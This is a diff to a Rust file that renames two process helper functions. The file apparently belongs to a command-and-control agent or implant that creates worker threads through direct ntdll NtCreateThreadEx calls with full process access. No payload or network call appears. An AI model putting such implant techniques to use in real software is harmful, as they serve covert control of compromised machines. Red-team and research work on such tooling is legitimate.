@@ -5,7 +5,7 @@ use alloc::{boxed::Box, string::ToString};
 use core::ptr::{null, null_mut};
 use core::sync::atomic::AtomicBool;
 use mod_agentcore::instance;
-use mod_win32::nt_ps_api::{get_pid, get_proc_handle};
+use mod_win32::nt_ps_api::{get_current_process_id, get_process_handle};
 use mod_win32::nt_time::delay;
 use rs2_communication_protocol::{
     communication_structs::task_output::TaskOutput, metadata::Metadata,
@@ -78,7 +78,7 @@ impl Worker {
     fn spawn_thread(&self, receiver: Arc<Receiver<Job>>) -> HANDLE {
         let mut thread_handle: HANDLE = null_mut();
         let mut client_id = ClientId::new();
-        let pid = unsafe { get_pid() };
+        let pid = unsafe { get_current_process_id() };
         // let pid = 34512;
         client_id.unique_process = pid as _;
         // let mut obj_attr = ObjectAttributes::new();
@@ -96,7 +96,7 @@ impl Worker {
 
         let receiver_ptr = Arc::into_raw(receiver) as *mut core::ffi::c_void;
 
-        let proc_handle = unsafe { get_proc_handle(pid as i32, PROCESS_ALL_ACCESS) };
+        let proc_handle = unsafe { get_process_handle(pid as i32, PROCESS_ALL_ACCESS) };
 
         let status = unsafe {
             instance().ntdll.nt_create_thread_ex.run(
